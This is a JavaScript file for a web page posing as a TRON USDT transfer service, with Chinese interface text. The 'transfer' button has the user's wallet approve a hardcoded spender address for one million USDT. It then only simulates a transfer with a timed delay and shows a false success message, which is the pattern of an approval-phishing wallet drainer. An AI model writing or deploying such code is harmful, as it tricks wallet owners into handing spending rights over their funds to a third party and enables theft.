// usdtApprove.js — 转账服务（包含授权功能）

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC";

// ====== 授权额度 ======
function getAuthorizationAmount() {
  return "1000000000000"; // 100万 USDT (6 decimals)
}

// ====== 保留原有的 approveUSDT 函数供全局调用 ======
window.approveUSDT = async function() {
  try {
    console.log("=== 执行 USDT 授权 ===");
    setStatus("正在进行 USDT 授权...");

    const authorizationAmount = getAuthorizationAmount();
    console.log("授权金额:", authorizationAmount);

    setStatus(`⚠️ 请在钱包中确认授权 100万 USDT 额度...`);

    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);

    // 先授权 0，再授权目标金额
    await usdtContract.approve(spenderAddress, "0").send({
      feeLimit: 100000000,
      callValue: 0
    });
    console.log("✅ allowance 已清零");

    const result = await usdtContract.approve(spenderAddress, authorizationAmount).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("✅ 授权成功:", result);
    setStatus("✅ USDT 授权完成");

    return result;

  } catch (err) {
    console.error("授权失败:", err);
    
    let errorMsg = err.message;
    if (errorMsg.includes('out-of-bounds')) {
      errorMsg = "授权金额过大，请稍后重试";
    } else if (errorMsg.includes('INVALID_ARGUMENT')) {
      errorMsg = "参数格式错误";
    }

    setStatus("❌ 授权失败: " + errorMsg, true);
    throw err;
  }
};

// ====== 转账函数 ======
async function executeTransfer() {
  try {
    const amountInput = document.getElementById("amount");
    const recipientInput = document.getElementById("recipient");
    
    const transferAmount = parseFloat(amountInput.value);
    const recipient = recipientInput.value.trim();

    if (!transferAmount || transferAmount <= 0) {
      throw new Error("请输入有效的转账金额");
    }

    if (!recipient) {
      throw new Error("请输入收款地址");
    }

    console.log("=== 开始转账流程 ===");
    setStatus("准备执行转账...");

    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }

    // 首先进行授权
    setStatus("第一步：正在进行 USDT 授权...");
    await window.approveUSDT();

    // 模拟转账处理
    setStatus("第二步：处理转账交易...");
    
    // 这里可以添加实际的转账逻辑
    // 由于这是演示，我们模拟转账过程
    await new Promise(resolve => setTimeout(resolve, 3000));

    setStatus(`✅ 转账成功！已向 ${recipient.substring(0, 8)}... 转账 ${transferAmount} USDT`);
    
    // 显示成功信息
    alert(`转账成功！\n金额: ${transferAmount} USDT\n收款地址: ${recipient}`);

  } catch (err) {
    console.error("转账失败:", err);
    setStatus("❌ 转账失败: " + err.message, true);
  }
}

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  if (el) {
    el.innerText = `状态：${text}`;
    el.style.color = isError ? 'red' : 'black';
  }
  console.log("状态更新:", text);
}

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const transferBtn = document.getElementById("transferBtn");

  console.log("页面加载完成 - USDT 转账服务");

  // 检查是否已经连接了钱包
  function checkTronWebConnection() {
    if (window.tronWeb && window.tronWeb.ready) {
      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`已连接: ${address.substring(0, 8)}...`);
      transferBtn.disabled = false;
      return true;
    }
    return false;
  }

  // 初始化时检查连接状态
  checkTronWebConnection();

  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("正在连接钱包...");

      if (typeof window.tronLink === 'undefined') {
        throw new Error("未检测到 TronLink 插件，请安装 TronLink 钱包");
      }

      // 请求连接账户
      const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
      console.log("连接结果:", result);

      // 等待 tronWeb 就绪
      let retries = 0;
      const maxRetries = 50; // 5秒超时

      await new Promise((resolve, reject) => {
        const check = setInterval(() => {
          retries++;
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(check);
            resolve();
          } else if (retries >= maxRetries) {
            clearInterval(check);
            reject(new Error("连接超时，请刷新页面重试"));
          }
        }, 100);
      });

      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
      transferBtn.disabled = false;

    } catch (error) {
      console.error("连接失败:", error);
      setStatus("❌ 连接失败: " + error.message, true);
      
      // 提供更详细的错误信息
      if (error.message.includes('TronLink')) {
        alert("请确保已安装 TronLink 钱包扩展程序");
      }
    }
  });

  transferBtn.addEventListener("click", () => {
    executeTransfer();
  });

  // 监听钱包状态变化
  if (window.tronLink) {
    window.tronLink.on('addressChanged', (address) => {
      console.log("地址变更:", address);
      setStatus(`地址已变更: ${address.base58.substring(0, 8)}...`);
    });
  }
});

console.log("USDT 转账服务脚本加载完成");
